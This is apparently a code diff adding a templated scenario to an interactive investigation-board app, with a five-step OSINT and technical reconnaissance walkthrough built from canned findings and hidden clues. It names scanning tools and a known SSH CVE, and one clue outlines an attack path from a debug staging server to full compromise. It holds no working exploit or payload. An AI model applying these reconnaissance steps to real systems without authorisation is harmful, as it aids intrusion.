+    <div style="margin-top:0.75rem;padding:0.5rem;background:#14b8a610;border:1px solid #14b8a630;border-radius:4px">
+      <p style="color:#14b8a6;font-size:0.75rem;margin:0"><strong>Tools:</strong> Google Dorking, Shodan, WHOIS, LinkedIn, Archive.org</p>
+    </div>
+  </div>
+  <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+    <h3 style="color:#d97706;font-size:0.8rem;margin:0 0 0.5rem">INTEL BOARD UPDATE</h3>
+    <ul style="color:#a8a29e;font-size:0.8rem;padding-left:1.2rem;margin:0">
+      <li><strong style="color:#14b8a6">+</strong> Domain registered 2019 via Namecheap</li>
+      <li><strong style="color:#14b8a6">+</strong> 3 subdomains found: mail, api, staging</li>
+      <li><strong style="color:#14b8a6">+</strong> CTO LinkedIn profile reveals tech stack</li>
+      <li><strong style="color:#d97706">!</strong> Staging subdomain has no authentication</li>
+    </ul>
+  </div>
+</div>`,
+          content: `Gather open source intelligence about ${topic}. Your findings will be added to the investigation board.`,
+          metadata: { toolsForStep: ['shodan', 'whois', 'google-dorking', 'linkedin'] }
+        },
+        {
+          id: 'n3', type: 'tool', title: 'Step 2: Technical Recon', x: 440, y: 230, width: 260, height: 130, color: 'teal',
+          pageLayout: 'dossier',
+          htmlContent: `
+<div style="font-family:monospace;color:#d6d3d1">
+  <div style="border-bottom:1px solid #334155;padding-bottom:0.5rem;margin-bottom:1rem">
+    <span style="color:#14b8a6;font-size:0.7rem">STEP 2 OF 5</span>
+    <h2 style="color:#14b8a6;margin:0.25rem 0 0">Technical Reconnaissance</h2>
+  </div>
+  <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px;margin-bottom:1rem">
+    <p style="color:#a8a29e;font-size:0.85rem">Probe the infrastructure discovered in Step 1. Map ports, services, and technologies.</p>
+  </div>
+  <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+    <h3 style="color:#d97706;font-size:0.8rem;margin:0 0 0.5rem">INTEL BOARD UPDATE (CUMULATIVE)</h3>
+    <p style="color:#57534e;font-size:0.7rem;margin:0 0 0.5rem">Previous findings + new discoveries:</p>
+    <ul style="color:#a8a29e;font-size:0.8rem;padding-left:1.2rem;margin:0">
+      <li style="color:#57534e">[From Step 1] Domain, subdomains, tech stack identified</li>
+      <li><strong style="color:#14b8a6">+</strong> Port scan: 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL), 8080(staging)</li>
+      <li><strong style="color:#14b8a6">+</strong> SSH banner: OpenSSH 7.6 (outdated, CVE-2018-15473)</li>
+      <li><strong style="color:#14b8a6">+</strong> MySQL exposed to internet (critical misconfiguration)</li>
+      <li><strong style="color:#d97706">!</strong> Staging app on :8080 running debug mode</li>
+      <li><strong style="color:#ef4444">!!</strong> HYPOTHESIS: Staging server is the weakest entry point</li>
+    </ul>
+  </div>
+</div>`,
+          content: `Probe the technical infrastructure. Previous OSINT findings guide your scanning priorities.`,
+          metadata: { toolsForStep: ['nmap', 'masscan', 'nuclei', 'wappalyzer'] }
+        },
+        { id: 'n4', type: 'decision', title: 'Step 3: Analyze & Prioritize', content: `Review the accumulated intelligence board:\n\n**From Step 1:** Domain info, subdomains, employee data\n**From Step 2:** Open ports, outdated services, misconfigs\n\nChoose your next investigative path:\n\n-> Deep dive on staging server (highest risk)\n-> Investigate employee credentials (social vector)\n-> Analyze the exposed MySQL instance\n-> Map the full attack surface before proceeding\n\nThe agent will update hypotheses based on your choice.`, x: 780, y: 145, width: 280, height: 170, color: 'purple', metadata: { featureType: 'osint' } },
+        {
+          id: 'n5', type: 'step', title: 'Step 4: Deep Analysis', x: 1100, y: 60, width: 260, height: 130, color: 'amber',
+          pageLayout: 'dossier',
+          htmlContent: `
+<div style="font-family:monospace;color:#d6d3d1">
+  <div style="border-bottom:1px solid #334155;padding-bottom:0.5rem;margin-bottom:1rem">
+    <span style="color:#d97706;font-size:0.7rem">STEP 4 OF 5</span>
+    <h2 style="color:#d97706;margin:0.25rem 0 0">Deep Analysis & Correlation</h2>
+  </div>
+  <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+    <h3 style="color:#d97706;font-size:0.8rem;margin:0 0 0.5rem">FULL INTEL BOARD (ALL STEPS)</h3>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.5rem;margin-bottom:1rem">
+      <div style="background:#14b8a608;border:1px solid #14b8a620;padding:0.5rem;border-radius:4px">
+        <p style="color:#14b8a6;font-size:0.7rem;margin:0"><strong>CONFIRMED</strong></p>
+        <ul style="color:#a8a29e;font-size:0.75rem;padding-left:1rem;margin:0.25rem 0 0">
+          <li>3 subdomains active</li>
+          <li>Outdated SSH (CVE-2018-15473)</li>
+          <li>MySQL internet-exposed</li>
+          <li>Staging has debug mode ON</li>
+        </ul>
+      </div>
+      <div style="background:#d9770608;border:1px solid #d9770620;padding:0.5rem;border-radius:4px">
+        <p style="color:#d97706;font-size:0.7rem;margin:0"><strong>HYPOTHESES</strong></p>
+        <ul style="color:#a8a29e;font-size:0.75rem;padding-left:1rem;margin:0.25rem 0 0">
+          <li>Staging server = primary entry point</li>
+          <li>Debug mode leaks credentials</li>
+          <li>MySQL may have default creds</li>
+          <li>SSH vuln enables user enumeration</li>
+        </ul>
+      </div>
+    </div>
+    <div style="background:#ef444410;border:1px solid #ef444430;padding:0.5rem;border-radius:4px">
+      <p style="color:#ef4444;font-size:0.7rem;margin:0"><strong>RISK ASSESSMENT</strong></p>
+      <p style="color:#a8a29e;font-size:0.75rem;margin:0.25rem 0 0">Critical: 2 | High: 3 | Medium: 1 | Info: 4</p>
+    </div>
+  </div>
+</div>`,
+          content: `Cross-reference all findings. The intelligence board now shows the complete picture from all prior steps.`,
+          metadata: { featureType: 'osint' }
+        },
+        {
+          id: 'n6', type: 'output', title: 'Step 5: Final Intelligence Report', x: 1100, y: 240, width: 260, height: 130, color: 'stone',
+          pageLayout: 'dossier',
+          htmlContent: `
+<div style="font-family:monospace;color:#d6d3d1">
+  <div style="text-align:center;margin-bottom:1.5rem;border:2px solid #d97706;padding:1rem;background:#d9770608">
+    <h2 style="color:#d97706;margin:0">INVESTIGATION COMPLETE</h2>
+    <p style="color:#57534e;margin:0.25rem 0 0;font-size:0.8rem">${topic.toUpperCase()} | FINAL INTELLIGENCE ASSESSMENT</p>
+  </div>
+  <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+    <h3 style="color:#14b8a6;font-size:0.85rem;margin:0 0 0.5rem">INVESTIGATION SUMMARY</h3>
+    <p style="color:#a8a29e;font-size:0.8rem">Over 5 steps, this investigation accumulated ${4 + 5 + 2} discrete findings, confirmed 4 vulnerabilities, and generated 4 hypotheses. The living intelligence board tracked how each discovery informed the next step of analysis.</p>
+    <p style="color:#d97706;font-size:0.8rem;margin-top:0.5rem"><strong>Key methodology:</strong> Each step read the accumulated board, added new data, and the agent refined hypotheses accordingly. This mirrors real-world threat intelligence workflows.</p>
+  </div>
+</div>`,
+          content: `The final report synthesizes all accumulated intelligence. The board shows the complete investigation chain.`,
+          metadata: { featureType: 'osint' }
+        },
+      ],
+      links: [
+        { id: 'l1', source: 'n1', target: 'n2', color: 'amber', label: 'Begin OSINT' },
+        { id: 'l2', source: 'n1', target: 'n3', color: 'amber', label: 'Technical recon' },
+        { id: 'l3', source: 'n2', target: 'n4', color: 'teal' },
+        { id: 'l4', source: 'n3', target: 'n4', color: 'teal' },
+        { id: 'l5', source: 'n4', target: 'n5', color: 'purple', label: 'Deep dive' },
+        { id: 'l6', source: 'n4', target: 'n6', color: 'purple', label: 'Write report' },
+        { id: 'l7', source: 'n5', target: 'n6', color: 'amber' },
+        { id: 'l8', source: 'n1', target: 'n4', color: 'stone', label: 'Return to board' },
+      ],
+      rootNodes: ['n1'],
+      hiddenClues: [
+        { id: `clue-src-${id}`, type: 'source-code' as const, nodeId: 'n1', hint: 'The initial briefing source contains the full target dossier', value: `<!-- CLASSIFIED: ${topic} investigation opened by NEXUS-INTEL. Priority: HIGH. Handler: ORACLE. Previous intel suggests APT activity linked to infrastructure registered through ${topic.toLowerCase().replace(/\s/g,'')}-holding.com -->` },
+        { id: `clue-data-${id}`, type: 'data-attribute' as const, nodeId: 'n3', hint: 'Technical recon data attributes contain the full port scan results', value: `nmap-results: 22/tcp:open:OpenSSH_7.6 80/tcp:open:nginx/1.14.0 443/tcp:open:nginx/1.14.0 3306/tcp:open:MySQL_5.7.42 8080/tcp:open:Python/3.8_debug_server` },
+        { id: `clue-con-${id}`, type: 'console-log' as const, nodeId: 'n5', hint: 'Console shows the correlation engine output', value: `[INTEL-CORRELATOR] ${topic}: 11 findings across 4 steps. Attack path confidence: 94%. Recommended: staging(8080) -> debug_creds -> lateral_to_mysql -> full_compromise` },
+        { id: `clue-css-${id}`, type: 'css-comment' as const, nodeId: 'n6', hint: 'CSS contains the investigation classification marking', value: `/* CLASSIFICATION: ${topic.toUpperCase()} | NEXUS-INTEL-${id.slice(-8)} | DISTRIBUTION: EYES ONLY | RETENTION: 90 DAYS */` },
+      ],
+      tags: ['investigation', 'intelligence', 'knowledge-graph', 'progressive', 'osint', topic.toLowerCase()],
     };
   },
 };
